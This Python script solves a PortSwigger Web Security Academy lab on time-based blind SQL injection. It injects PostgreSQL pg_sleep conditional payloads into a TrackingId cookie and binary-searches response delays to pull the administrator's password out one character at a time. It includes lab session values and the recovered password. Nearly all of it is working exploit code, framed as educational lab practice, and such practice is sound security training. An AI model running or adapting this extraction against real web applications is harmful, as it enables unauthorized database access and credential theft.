""" 
MIT License

Copyright (c) 2024 [HackHuang]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

ADDITIONAL DISCLAIMER:
This software is intended for educational and security research purposes only.
Users are solely responsible for ensuring compliance with all applicable laws
and regulations. The author does not encourage or condone the use of this 
software for malicious purposes.
"""

# Author: HackHuang
# Description: For Lab: Blind SQL injection with time delays and information retrieval
# Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
# Last Modified: 2024/12/31

import requests
import tracemalloc
import time
from typing import *
from contextlib import contextmanager

LOWERCASE_CHAR_LIST: Final[Tuple[str, ...]] = ('a','b','c','d','e','f','g','h','i','j','k','l','m','n',
                                               'o','p','q','r','s','t','u','v','w','x','y','z')
UPPERCASE_CHAR_LIST: Final[Tuple[str, ...]] = ('A','B','C','D','E','F','G','H','I','J','K','L','M','N',
                                               'O','P','Q','R','S','T','U','V','W','X','Y','Z')
NUMBER_CHAR_LIST: Final[Tuple[str, ...]] = ('0','1','2','3','4','5','6','7','8','9')
# 1.Note that "\\" will output: "\"
# 2.Note that '—'(8212) is difference from '-'(45)
OTHERS_CHAR_LIST: Final[Tuple[str, ...]] = (' ', ',', '"', '#', '$', '%', '&', "'", '(', ')', '*', ',', '.', 
                                            '/', ';', '<', '=', '>', '@', '[', "\\", ']', '_', '`', '{', '|', '}', '©', '€', '—', '!', '-',)

# all_char_sorted_list: All char lists included, such as four lists as above
all_char_list: List[str] = list((*LOWERCASE_CHAR_LIST, *UPPERCASE_CHAR_LIST, *NUMBER_CHAR_LIST, *OTHERS_CHAR_LIST))
all_char_ascii_list: List[int] = [ord(char) for char in all_char_list]
all_char_ascii_sorted_list: List[int] = sorted(all_char_ascii_list)
all_char_sorted_list: List[str] = [chr(char_ascii) for char_ascii in all_char_ascii_sorted_list]

host: str = "0a1b008c035da4058332c1f4001500d1.web-security-academy.net" # Should be updated after the lab time out
url: str = f"https://{host}/login"
session: str = "session=MLHdTmJBMdWGntNBbPiPt1yhwLImGpnw" # Should be updated after the lab time out
tracking_id: str = f"TrackingId=d2Falbeh8mnS5Npg" # Should be updated after the lab time out

@contextmanager
def print_code_snippet_performance(operation: str) -> Generator[None, None, None]:
    tracemalloc.start()
    start_time = time.perf_counter()
    print(f'Starting {operation}')
    yield
    current_memory, peak_memory = tracemalloc.get_traced_memory()
    end_time = time.perf_counter()
    print(f'Memory usage:\t\t {current_memory / 10**6:.6f} MB \n'
          f'Peak memory usage:\t {peak_memory / 10**6:.6f} MB')
    print(f'Finished {operation} in {end_time - start_time:.6f} seconds\n')
    tracemalloc.stop()

def get_method(url: str, headers: Dict[str, str], respected_response_time: int) -> bool:
    start_time: float = time.perf_counter()
    requests.get(url=url, headers=headers)
    end_time: float = time.perf_counter()
    elapsed_time: float = round(end_time - start_time, 6)
    print(f"end_time({end_time:.6f}) - start_time({start_time:.6f}) = {elapsed_time:.6f}")
    return True if (elapsed_time >= respected_response_time) else False

def data_binary_search(sql_equal: str, sql_greater: str, sql_tail: str, respected_response_time: int) -> int:  
    low: int = 0
    high: int = len(all_char_ascii_sorted_list) - 1
    while low <= high:
        mid: int = (low + high) // 2
        char_ascii: int = all_char_ascii_sorted_list[mid]
        sql_injection_euqal: str = sql_equal + f'{char_ascii}' + sql_tail + '--+'
        sql_injection_greater: str = sql_greater + f'{char_ascii}' + sql_tail + '--+'
        cookie_1 = tracking_id + sql_injection_euqal + "; " + session
        cookie_2 = tracking_id + sql_injection_greater + "; " + session
        if get_method(url=url, headers={"Host": host, "Cookie": cookie_1}, respected_response_time=respected_response_time):
            print(f'Get the char index successfully ---> {sql_injection_euqal}')
            return mid
        elif get_method(url=url, headers={"Host": host, "Cookie": cookie_2}, respected_response_time=respected_response_time):
            print(f'({low}, {mid}, {high}) ---> {sql_injection_greater}')
            low = mid + 1
        else:
            print(f'({low}, {mid}, {high}) ---> OPPOSITE : {sql_injection_greater}')
            high = mid - 1
    return -1

def get_data_with_binary_search(password_length: int, respected_response_time: int) -> str:
    data_str: str = ''
    count: int = 0
    substr_begin_index: int = 1
    while count < password_length:
        # ' and (select case when (ascii(substr((select password from users where username='administrator'),1,1))=100) then pg_sleep(10) else null end is null)--+
        sql_injection_equal: str = f"' and (select case when (ascii(substr((select password from users where username='administrator'),{substr_begin_index},1)) = "
        sql_injection_greater: str = f"' and (select case when (ascii(substr((select password from users where username='administrator'),{substr_begin_index},1)) > "
        sql_injection_tail: str = f") then pg_sleep({respected_response_time}) else null end is null)"
        data_char_ascii_index: int = data_binary_search(sql_equal=sql_injection_equal, sql_greater=sql_injection_greater, 
                                                        sql_tail=sql_injection_tail, respected_response_time=respected_response_time)
        if data_char_ascii_index == -1:
            print(f'Not found the index of data char')
            exit()
        data_char_ascii = all_char_ascii_sorted_list[data_char_ascii_index]
        data_str = data_str + chr(data_char_ascii)
        substr_begin_index = substr_begin_index + 1
        count = count + 1
        print(f'Got the password : {data_str}, and its length : {len(data_str)}\n')
    return data_str

# The final password is : v72zxi35qgg3kh6w8pw3
# Memory usage:            0.055235 MB 
# Peak memory usage:       0.123534 MB
# Finished get password data with binary search:  in 1378.184363 seconds
with print_code_snippet_performance('get password data with binary search: '):
    password_length: int = 20
    respected_response_time: int = 10
    password_str: str = get_data_with_binary_search(password_length=password_length, respected_response_time=respected_response_time)
    print(f'The final password is : {password_str}')